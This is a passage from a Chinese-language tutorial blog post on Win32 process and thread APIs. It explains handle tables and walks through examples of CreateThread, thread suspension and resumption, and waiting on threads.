<h3 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h3><p>句柄表存储的就是一种映射关系，每个进程的内核对象对应一个句柄，用户不能直接访问内核对象（如果用户给了一个错误的内核地址会蓝屏）。为了防止访问错误的内核对象地址，Windows在用户层和内核层中间加了一个句柄表，用户通过访问句柄表来访问内核对象，句柄表相当于一道内核层外的防火墙。</p>
<img src="/2024/07/05/Win32API/image-20240304202133292.png" alt="image-20240304202133292" style="zoom:67%;">

<p>句柄表是一张私有的表，只针对当前的进程才有意义。</p>
<p><img src="/2024/07/05/Win32API/image-20240304222323428.png" alt="image-20240304222323428"></p>
<p>如果是CloseHandle的话，内核对象不会死，而是内核对象的计数器减一（当有多个对象都运行了内核对象A）。如果所有的进程都把内核对象杀掉，也就是内核对象的计数变成0的时候，这个内核对象就会被销毁。</p>
<p>进程里有线程，线程不死，进程就不会死；如果进程里的唯一线程死了，进程就死了。</p>
<h3 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h3><h4 id="ID与句柄表"><a href="#ID与句柄表" class="headerlink" title="ID与句柄表"></a>ID与句柄表</h4><p>进程ID——PID，使用程序将进程ID打印出来为16进制，比如0x2914，转换成十进制是10516，也就是这里的资源管理器</p>
<img src="/2024/07/05/Win32API/image-20240305100538731.png" alt="image-20240305100538731" style="zoom:50%;">

<p>句柄表</p>
<p>句柄表是一个程序私有的，如果通过另一个程序关掉另一个程序，不能使用被关闭进程的句柄表，因为这个句柄表是私有的，程序A无法通过程序B的句柄表关闭程序B。</p>
<p>比如，程序A的句柄是0xf0,<img src="/2024/07/05/Win32API/image-20240305145458857.png" alt="image-20240305145458857" style="zoom:67%;"></p>
<p>此时如果用程序B来关闭程序A：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	hProcess = (HANDLE)<span class="number">0xf0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">1</span>))</span><br><span class="line">	&#123;				</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;终止程序失败 %d \n&quot;</span>, GetLastError());		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">终止程序失败：6</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240305150145954.png" alt="image-20240305150145954" style="zoom:33%;"> 返回这个值说明句柄无效，因为0xf0是A的私有句柄</p>
<p>但是，进程ID（dwProcessID）是公有的，所以还是可以通过使用PID来终止程序。</p>
<h3 id="以挂起形式创建进程"><a href="#以挂起形式创建进程" class="headerlink" title="以挂起形式创建进程"></a>以挂起形式创建进程</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">	LPCTSTR lpApplicationName.						<span class="comment">//name of exeutable module</span></span></span><br><span class="line"><span class="params">	LPTSTR lpCommandLine,							<span class="comment">//command line string</span></span></span><br><span class="line"><span class="params">	LPSECURITY_ATTRIBUTES lpProcessAttributes,		<span class="comment">//SD</span></span></span><br><span class="line"><span class="params">	LPSECURITY_ATTRIBUTES lpThreadAttributes,		<span class="comment">//SD</span></span></span><br><span class="line"><span class="params">	BOOL bInheritHandles,							<span class="comment">//handle inheritance option</span></span></span><br><span class="line"><span class="params">	**DWORD dwCreationFlags,**							<span class="comment">//creation flags</span></span></span><br><span class="line"><span class="params">	LPVOID lpEnvironment,							<span class="comment">//new environment block</span></span></span><br><span class="line"><span class="params">	LPCTSTR lpCurrentDirectory,						<span class="comment">//current directory name</span></span></span><br><span class="line"><span class="params">	LPSTARTUPINFO lpStartupInfo,					<span class="comment">//startup information</span></span></span><br><span class="line"><span class="params">	LPPROCESS_INFOMATION lpProcessInformation		<span class="comment">//process information</span></span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>在dwCreationFlags中，如果值为0，那么父进程和子进程是共用一个控制台的，如果要父进程和子进程分别打开一个控制台，那么需要将dwCreationFlags设置为<code>CREATE_NEW_CONSOLE</code>。**其中有一个值为<code>CREATE_SUSPENDED:</code>**以挂起的形式创建一个进程</p>
<h3 id="模块目录与工作目录"><a href="#模块目录与工作目录" class="headerlink" title="模块目录与工作目录"></a>模块目录与工作目录</h3><p>两个API：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GetModuleFileName		<span class="comment">//获取模块路径</span></span><br><span class="line">GetCurrentDirectory		<span class="comment">//获取工作路径</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> strModule[<span class="number">256</span>];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>, strModule, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> strWork[<span class="number">1000</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">1000</span>;</span><br><span class="line">	GetCurrentDirectory(<span class="number">1000</span>, strWork);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;模块路径：%s\n工作路径：%s\n&quot;</span>, strModule, strWork);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模块路径：C:\Users\23394\Desktop\code\C C++\win32AP\Debug\win32AP.exe</span><br><span class="line">工作路径：C:\Users\23394\Desktop\code\C C++\win32AP</span><br></pre></td></tr></table></figure>

<p>模块路径就是exe所在位置，工作路径由创建这个模块的父进程填写</p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><h3 id="线程-1"><a href="#线程-1" class="headerlink" title="线程"></a>线程</h3><p>线程是附属在进程上的执行实体，是代码的执行流程</p>
<p>一个进程可以包含多个线程，但一个进程至少包含一个线程</p>
<h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p><strong>CreateThread</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]            SIZE_T                  dwStackSize,</span></span><br><span class="line"><span class="params">  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,</span></span><br><span class="line"><span class="params">  [in, optional]  __drv_aliasesMem LPVOID lpParameter,</span></span><br><span class="line"><span class="params">  [in]            DWORD                   dwCreationFlags,</span></span><br><span class="line"><span class="params">  [out, optional] LPDWORD                 lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>创建一个线程：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line"></span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>DWORD WINAPI ThreadProc(LPVOID lpParameter)</code>这个函数可以没有返回值和参数，但是在使用时需要强制转换成<code>(LPTHREAD_START_ROUTINE)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">ThreadProc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line"></span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程也可以传入参数，参数可以是任何类型，只要自己强制转换一个类型即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc,(LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上函数通过闯传入一个int类型指针，先强转成LPTHREAD_START_ROUTINE类型，传入一个指针，再在线程中将这个指针转换成自己需要的类型即可。</p>
<h3 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h3><p>让自己停下来<code>Sleep()</code>，停止当前线程。<br>让别的线程停下来<code>SuspendThread(hThread)</code><br>线程恢复<code>ResumeThread</code></p>
<p>线程挂起几次就要继续几次，如果挂起两次，就要继续两次才能继续执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">handles</span> &#123;</span></span><br><span class="line">	HANDLE h1;</span><br><span class="line">	HANDLE h2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc3</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span>* <span class="title">hp</span> =</span> (handles*)lpParameter;</span><br><span class="line">	SuspendThread(hp-&gt;h1);</span><br><span class="line">	Sleep(<span class="number">5000</span>);</span><br><span class="line">	ResumeThread(hp-&gt;h1);</span><br><span class="line">	SuspendThread(hp-&gt;h2);</span><br><span class="line">	Sleep(<span class="number">5000</span>);</span><br><span class="line">	ResumeThread(hp-&gt;h2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread1;</span><br><span class="line">	hThread1 = CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>, ThreadProc1,(LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">30</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread2;</span><br><span class="line">	hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span> <span class="title">Handles</span>;</span></span><br><span class="line">	Handles.h1 = hThread1;</span><br><span class="line">	Handles.h2 = hThread2;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">handles</span>* <span class="title">ph</span> =</span> &amp;Handles;</span><br><span class="line"></span><br><span class="line">	HANDLE hThread3;</span><br><span class="line">	hThread3 = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc3, (LPTHREAD_START_ROUTINE)ph, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	Sleep(<span class="number">200000000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread1);</span><br><span class="line">	CloseHandle(hThread2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上是一个线程交替的实例。</p>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++++1</span><br><span class="line">++++++++++2</span><br><span class="line">++++++++++3</span><br><span class="line">++++++++++4</span><br><span class="line">++++++++++5</span><br><span class="line">++++++++++6</span><br><span class="line">++++++++++7</span><br><span class="line">++++++++++8</span><br><span class="line">++++++++++9</span><br><span class="line">----------1</span><br><span class="line">----------2</span><br><span class="line">----------3</span><br><span class="line">----------4</span><br><span class="line">----------5</span><br><span class="line">----------6</span><br><span class="line">----------7</span><br><span class="line">----------8</span><br><span class="line">----------9</span><br><span class="line">++++++++++10</span><br><span class="line">----------10</span><br><span class="line">++++++++++11</span><br><span class="line">++++++++++12</span><br><span class="line">++++++++++13</span><br><span class="line">++++++++++14</span><br><span class="line">++++++++++15</span><br><span class="line">++++++++++16</span><br><span class="line">++++++++++17</span><br><span class="line">++++++++++18</span><br><span class="line">++++++++++19</span><br><span class="line">++++++++++20</span><br><span class="line">++++++++++21</span><br><span class="line">++++++++++22</span><br><span class="line">++++++++++23</span><br><span class="line">++++++++++24</span><br><span class="line">++++++++++25</span><br><span class="line">++++++++++26</span><br><span class="line">++++++++++27</span><br><span class="line">++++++++++28</span><br><span class="line">++++++++++29</span><br><span class="line">++++++++++30</span><br></pre></td></tr></table></figure>

<h3 id="等待线程中的API"><a href="#等待线程中的API" class="headerlink" title="等待线程中的API"></a>等待线程中的API</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="number">1</span>&gt;WaitForSingleObject();</span><br><span class="line">&lt;<span class="number">2</span>&gt;WaitForMultiplePbjects();</span><br><span class="line">&lt;<span class="number">3</span>&gt;GetExitCodeThread();</span><br></pre></td></tr></table></figure>

<h4 id="WaitForSingleObject等待单个线程"><a href="#WaitForSingleObject等待单个线程" class="headerlink" title="WaitForSingleObject等待单个线程"></a>WaitForSingleObject等待单个线程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">WaitForSingleObject</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE hHandle,			<span class="comment">//handle to object	对象句柄</span></span></span><br><span class="line"><span class="params">	DWORD dwMilliseconds	<span class="comment">//time-out interval 超时时间间隔</span></span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p>执行这个函数的时候，这个函数所在的当前线程会阻塞，等待WaitForSingleObject中传入的线程执行完毕后，WaitForSingleObject后面的程序才会执行。</p>
<img src="/2024/07/05/Win32API/image-20240305222427024.png" alt="image-20240305222427024" style="zoom:50%;">

<h4 id="WaitForMultiplePbjects等待多个线程"><a href="#WaitForMultiplePbjects等待多个线程" class="headerlink" title="WaitForMultiplePbjects等待多个线程"></a>WaitForMultiplePbjects等待多个线程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">WaitForMultipleObjects</span><span class="params">(</span></span><br><span class="line"><span class="params">	DWORD        nCount,			<span class="comment">//等待几个线程对象</span></span></span><br><span class="line"><span class="params">	<span class="type">const</span> HANDLE *lpHandles,		<span class="comment">//线程数组</span></span></span><br><span class="line"><span class="params">	BOOL         bWaitAll,			<span class="comment">//等待模式 TRUE/FALSE前者为全部线程状态都发生改变，后者为有任意一个线程状态发生改变</span></span></span><br><span class="line"><span class="params">	DWORD        dwMilliseconds		<span class="comment">//超时时间，一直等待为INFINITE</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//WaitForSingleObject(hThread1,INFINITE);</span></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetExitCodeThread读取线程返回值"><a href="#GetExitCodeThread读取线程返回值" class="headerlink" title="GetExitCodeThread读取线程返回值"></a>GetExitCodeThread读取线程返回值</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">GetExitCodeThread</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE  hThread,</span></span><br><span class="line"><span class="params">	LPDWORD lpExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD dwResultArray[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">0</span>], &amp;dwResultArray[<span class="number">0</span>]);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">1</span>], &amp;dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span 